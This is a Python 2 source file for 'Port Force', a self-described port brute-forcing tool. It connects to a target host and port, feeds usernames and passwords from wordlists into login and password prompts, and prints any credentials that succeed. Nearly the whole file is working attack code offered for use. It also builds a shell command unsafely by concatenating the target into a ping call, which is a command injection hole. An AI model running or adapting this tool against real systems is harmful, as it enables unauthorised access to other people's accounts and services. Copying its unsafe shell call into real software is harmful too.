#!/usr/bin/python

import socket
import sys
import getopt
import os
import datetime
import time

class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

def banner():
    print bcolors.HEADER + "    ____             __     ______                   " + bcolors.ENDC
    print bcolors.HEADER + "   / __ \____  _____/ /_   / ____/___  _____________ " + bcolors.ENDC
    print bcolors.HEADER + "  / /_/ / __ \/ ___/ __/  / /_  / __ \/ ___/ ___/ _ \ " + bcolors.ENDC
    print bcolors.HEADER + " / ____/ /_/ / /  / /_   / __/ / /_/ / /  / /__/  __/" + bcolors.ENDC
    print bcolors.HEADER + "/_/    \____/_/   \__/  /_/    \____/_/   \___/\___/ " + bcolors.ENDC
    print
    print bcolors.HEADER + "             Created By: Jack Halon (KKB)            " + bcolors.ENDC
    print bcolors.HEADER + "                 Twitter: @jack_halon                " + bcolors.ENDC
    print
    print

                                                     
def usage():
    print "Port Force - A custom port Brute Forcing Tool"
    print "---------------------------------------------"
    print
    print "Usage: ./port_force -t 192.168.0.1 -p 1234 -u users.txt -P pass.txt"
    print
    print "-h --help            - display usage information"
    print "-t --target          - set IP address of Target"
    print "-p --port            - set Port for Target"
    print "-u --user            - set a list of usernames to brute force"
    print "-F --pass            - set a list of passwords to brute force"
    print
    print
    print "Examples:"
    print "---------------------------------------------"
    print "./port_force -t 192.168.0.1 -p 1234 -u names.txt -P pass.txt"
    print "./port_force -t 192.168.0.1 -p 1234 -u users.txt -P pass.txt"
    print "./port_force --target 192.168.0.1 --port 1234 --user names.txt --pass pass.txt"
    print "./port_force -t 192.168.0.1 -p 1234 -u name.txt -P /usr/share/wordlists/rockyou.txt"

def main():
    target = ""
    port = 0
    var_user = ""
    var_pass = ""
    user_len = 0
    cur_user = 0
    pass_len = 0
    cur_pass = 0

    banner()

    if not len(sys.argv[1:]):
        usage()
        sys.exit(1)
    
    try:
        opts, args = getopt.getopt(sys.argv[1:], "h:t:p:u:P:", ["help", "target", "port", "user=", "pass="])
    except getopt.GetoptError as err:
        print bcolors.FAIL + "[ERROR] - " + str(err) +"\n" + bcolors.ENDC
        usage()
        sys.exit(2)

    for opt, arg in opts:
        if opt == ("-h", "--help"):
            usage()
            sys.exit()
        elif opt in ("-t", "--target"):
            target = arg
        elif opt in ("-p", "--port"):
            port = int(arg)
        elif opt in ("-u", "--user"):
            var_user = arg
        elif opt in ("-P", "--pass"):
            var_pass = arg
        else:
            assert False, "Unhandled Option"
            
    # Check if userlist exists
    if not os.path.exists(var_user):
        sys.stderr.write(bcolors.FAIL + "[ERROR] - Userlist was not found!\n" + bcolors.ENDC)
        sys.exit(1) 
    
    # Check if passwordlist exists
    if not os.path.exists(var_pass):
        sys.stderr.write(bcolors.FAIL + "[ERROR] - Passwordlist was not found !\n" + bcolors.ENDC)
	sys.exit(1)
    else:
        print bcolors.OKGREEN + "[+] Loading Username and Password List...\n" + bcolors.ENDC
        time.sleep(3)

    uFile = open(var_user)
    uLines = len(uFile.readlines())
    user_len = uLines

    pFile = open(var_pass)
    pLines = len(pFile.readlines())
    pass_len = pLines
    
    print bcolors.OKGREEN + "[+] Attacking Target:%s on Port:%s\n" % (target, port) + bcolors.ENDC
    time.sleep(3)

    print bcolors.OKGREEN + "[+] Pinging %s to verify host connectvity...\n" % (target) + bcolors.ENDC
    time.sleep(3)

    # Ping host to make sure it is up
    response = os.system("ping -c 1 " + target + " > /dev/null")
    if response == 0:
        print bcolors.OKGREEN + "[OK] The host %s is up!\n" % (target) + bcolors.ENDC
    else:
        print bcolors.WARNING + "[FAIL] The host %s is down! Shutting down...\n" % (target) + bcolors.ENDC
        sys.exit(1)

    # Iterate through userlist and passwordlist
    with open(var_user, "r") as user_file:
        for user in user_file:
            cur_user += 1
            cur_pass = 0

            # Print current user being tested, and total number of users left
            print bcolors.OKGREEN + "[INFO] Testing User: %s (%s/%s)" % (user.strip(), cur_user, user_len) + bcolors.ENDC
            time.sleep(3)
            
            with open(var_pass, "r") as pass_file:
                # Get list length of passwordlist
                for passwd in pass_file:
                    cur_pass += 1
                    time_tag = time.strftime("%H:%M:%S")
                    
                    # Print current Username and Password used for brute force
                    print bcolors.OKBLUE + "[%s]     [-] Trying %s of %s - %s:%s" % (time_tag, cur_pass, pass_len, user.strip(), passwd.strip()) +bcolors.ENDC
                    time.sleep(0.5)
                    
                    # Connection
                    try:
                        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        s.connect((target, port))
                    except:
                        print bcolors.FAIL + "\n[ERROR] - Can't connect to the host!\n" + bcolors.ENDC
                        sys.exit(1)

                    # Request username
                    data = ""
                    while True:
                        tmp = s.recv(1)
                        if tmp == "":
                            break
                        data += tmp
                        if data.endswith("Enter login: "):
                            break

                    # Send username
                    s.send(user)

                    #Request password
                    data = ""
                    while True:
                        tmp = s.recv(1)
                        if tmp == "":
                            break
                        data += tmp
                        if data.endswith("Enter password: "):
                            break

                    # Send password
                    s.send(passwd)

                    # Answer
                    answer = s.recv(6)

                    # Display Username and Password if login is successful
                    if "Error!" not in answer:
                        print bcolors.OKGREEN + "[" + time_tag + "]     [!] Success! " + user.strip() + ":" + passwd.strip() + bcolors.ENDC
                        sys.exit(1)

                    if cur_user == user_len and cur_pass == pass_len:
                        print bcolors.FAIL + "\n[FAILED] - All possibilities exhausted! Shutting down..." + bcolors.ENDC

                    s.close()


if __name__ == "__main__":
    main()
